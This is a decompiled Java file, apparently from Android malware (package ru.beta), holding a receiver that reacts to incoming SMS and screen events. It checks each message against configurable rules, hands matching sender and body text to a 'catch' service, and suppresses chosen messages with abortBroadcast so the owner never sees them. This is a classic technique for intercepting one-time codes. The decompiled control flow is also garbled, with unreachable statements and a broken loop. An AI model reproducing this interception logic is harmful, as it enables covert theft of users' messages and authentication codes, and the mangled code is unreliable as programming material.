package ru.beta;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import java.io.PrintStream;
import org.json.JSONObject;

public class MainReceiver
  extends BroadcastReceiver
{
  public MainReceiver() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Object localObject = paramIntent.getAction();
    if (Constants.DEBUG)
    {
      System.out.println("MainReceiver::onReceive()");
      System.out.println("action: " + (String)localObject);
    }
    if (((String)localObject).equals("custom.alarm")) {
      if (Functions.loadSettings(paramContext)) {
        MainService.start(paramContext, paramIntent, "alarm");
      }
    }
    do
    {
      return;
      if (!((String)localObject).equals("android.provider.Telephony.SMS_RECEIVED")) {
        break;
      }
    } while (!Functions.loadSettings(paramContext));
    localObject = Functions.getSmsMessages(paramIntent.getExtras());
    int i = 0;
    int j = 0;
    for (;;)
    {
      int k = i;
      String str2;
      String str1;
      if (j < localObject.length)
      {
        str2 = localObject[j];
        str1 = str2.getOriginatingAddress();
        str2 = str2.getMessageBody();
      }
      try
      {
        Settings localSettings = Settings.getSettings();
        CatchResult localCatchResult = localSettings.isCatchMessage(str1, str2);
        if (localCatchResult.result) {
          MainService.start(paramContext, paramIntent, "catch", str1, str2, localCatchResult.key);
        }
        boolean bool = localSettings.isDeleteMessage(str1, str2);
        if (bool) {
          i = 1;
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          localException.printStackTrace();
        }
        j += 1;
      }
      if (i != 0)
      {
        k = i;
        if (k == 0) {
          break;
        }
        try
        {
          abortBroadcast();
          return;
        }
        catch (Exception paramContext)
        {
          paramContext.printStackTrace();
          return;
        }
      }
    }
    if (((String)localObject).equals("android.intent.action.SCREEN_ON"))
    {
      MainService.isRunning = true;
      MainService.start(paramContext, new Intent(), "logs");
      return;
    }
    if (((String)localObject).equals("android.intent.action.SCREEN_OFF"))
    {
      MainService.isRunning = false;
      return;
    }
    new Beta(paramContext, new JSONObject());
  }
}
